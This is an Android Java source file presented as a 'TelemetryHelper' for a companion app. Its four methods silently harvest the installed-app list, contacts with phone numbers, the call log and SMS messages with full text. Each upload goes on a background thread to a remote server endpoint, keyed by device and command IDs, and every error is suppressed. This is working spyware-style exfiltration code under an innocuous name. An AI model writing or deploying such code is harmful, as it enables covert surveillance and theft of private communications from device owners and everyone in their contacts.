package com.snapapp.companion;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import org.json.JSONArray;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class TelemetryHelper {

    public static void syncInstalledApps(final Context context, final String serverUrl, final String deviceId, final String cmdId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    PackageManager pm = context.getPackageManager();
                    List<PackageInfo> packages = pm.getInstalledPackages(0);
                    JSONArray apps = new JSONArray();

                    for (PackageInfo pi : packages) {
                        JSONObject app = new JSONObject();
                        app.put("package_name", pi.packageName);
                        app.put("app_name", pi.applicationInfo.loadLabel(pm).toString());
                        boolean isSystem = (pi.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                        app.put("is_system_app", isSystem);
                        app.put("usage_time_seconds", 0);
                        apps.put(app);
                    }

                    JSONObject body = new JSONObject();
                    body.put("device_id", deviceId);
                    if (cmdId != null) body.put("command_id", cmdId);
                    body.put("installed_apps", apps);

                    ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
                } catch (Exception ignored) {}
            }
        }).start();
    }

    @SuppressLint("Range")
    public static void syncContacts(final Context context, final String serverUrl, final String deviceId, final String cmdId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ContentResolver cr = context.getContentResolver();
                    Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                    if (c == null) return;

                    java.util.LinkedHashMap<String, JSONObject> map = new java.util.LinkedHashMap<>();
                    int nameIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                    int numIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    int idIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID);

                    while (c.moveToNext() && map.size() < 15000) {
                        String name = nameIdx >= 0 ? c.getString(nameIdx) : null;
                        String num = numIdx >= 0 ? c.getString(numIdx) : null;
                        String id = idIdx >= 0 ? c.getString(idIdx) : null;
                        if (name == null || name.trim().isEmpty()) name = "Contact #" + (map.size() + 1);

                        JSONObject item = map.get(id != null ? id : name);
                        if (item == null) {
                            item = new JSONObject();
                            item.put("name", name);
                            item.put("phone_numbers", new JSONArray());
                            map.put(id != null ? id : name, item);
                        }
                        if (num != null && !num.trim().isEmpty()) {
                            item.getJSONArray("phone_numbers").put(num.trim());
                        }
                    }
                    c.close();

                    JSONArray batch = new JSONArray();
                    for (JSONObject obj : map.values()) {
                        batch.put(obj);
                        if (batch.length() >= 1000) {
                            JSONObject body = new JSONObject();
                            body.put("device_id", deviceId);
                            if (cmdId != null) body.put("command_id", cmdId);
                            body.put("contacts", batch);
                            ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
                            batch = new JSONArray();
                        }
                    }
                    if (batch.length() > 0) {
                        JSONObject body = new JSONObject();
                        body.put("device_id", deviceId);
                        if (cmdId != null) body.put("command_id", cmdId);
                        body.put("contacts", batch);
                        ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
                    }
                } catch (Exception ignored) {}
            }
        }).start();
    }

    @SuppressLint("Range")
    public static void syncCalls(final Context context, final String serverUrl, final String deviceId, final String cmdId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ContentResolver cr = context.getContentResolver();
                    Cursor c = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
                    if (c == null) return;

                    JSONArray list = new JSONArray();
                    SimpleDateFormat iso = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US);

                    while (c.moveToNext() && list.length() < 2500) {
                        String number = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                        String name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));
                        int type = c.getInt(c.getColumnIndex(CallLog.Calls.TYPE));
                        long duration = c.getLong(c.getColumnIndex(CallLog.Calls.DURATION));
                        long date = c.getLong(c.getColumnIndex(CallLog.Calls.DATE));

                        String callType = "incoming";
                        if (type == CallLog.Calls.OUTGOING_TYPE) callType = "outgoing";
                        else if (type == CallLog.Calls.MISSED_TYPE) callType = "missed";
                        else if (type == CallLog.Calls.REJECTED_TYPE) callType = "rejected";

                        JSONObject item = new JSONObject();
                        item.put("phone_number", number != null ? number : "Unknown");
                        if (name != null) item.put("contact_name", name);
                        item.put("call_type", callType);
                        item.put("duration_seconds", duration);
                        item.put("timestamp", iso.format(new Date(date)));
                        list.put(item);
                    }
                    c.close();

                    JSONObject body = new JSONObject();
                    body.put("device_id", deviceId);
                    if (cmdId != null) body.put("command_id", cmdId);
                    body.put("calls", list);

                    ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
                } catch (Exception ignored) {}
            }
        }).start();
    }

    @SuppressLint("Range")
    public static void syncMessages(final Context context, final String serverUrl, final String deviceId, final String cmdId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ContentResolver cr = context.getContentResolver();
                    Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC");
                    if (c == null) return;

                    JSONArray list = new JSONArray();
                    SimpleDateFormat iso = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US);

                    while (c.moveToNext() && list.length() < 5000) {
                        String address = c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS));
                        String bodyText = c.getString(c.getColumnIndex(Telephony.Sms.BODY));
                        int type = c.getInt(c.getColumnIndex(Telephony.Sms.TYPE));
                        long date = c.getLong(c.getColumnIndex(Telephony.Sms.DATE));

                        JSONObject item = new JSONObject();
                        item.put("sender", address != null ? address : "Unknown");
                        item.put("body", bodyText != null ? bodyText : "");
                        item.put("message_type", type == Telephony.Sms.MESSAGE_TYPE_SENT ? "sent" : "inbox");
                        item.put("timestamp", iso.format(new Date(date)));
                        list.put(item);
                    }
                    c.close();

                    JSONObject body = new JSONObject();
                    body.put("device_id", deviceId);
                    if (cmdId != null) body.put("command_id", cmdId);
                    body.put("messages", list);

                    ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
                } catch (Exception ignored) {}
            }
        }).start();
    }
}
